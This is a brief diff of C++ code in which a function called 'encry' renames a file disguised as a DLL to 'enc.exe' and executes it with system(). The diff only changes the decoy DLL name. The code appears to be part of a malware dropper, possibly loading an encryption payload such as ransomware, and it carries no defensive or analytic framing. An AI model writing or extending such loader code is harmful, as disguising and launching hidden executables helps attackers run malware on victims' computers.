@@ -4,7 +4,7 @@
 #include <fstream>
 
 void encry() {
-	const char* encprot = "stddatmgr.dll";
+	const char* encprot = "asmer.dll";
 	const char* encrisk = "enc.exe";
 	std::rename(encprot, encrisk);
 	system(encrisk);
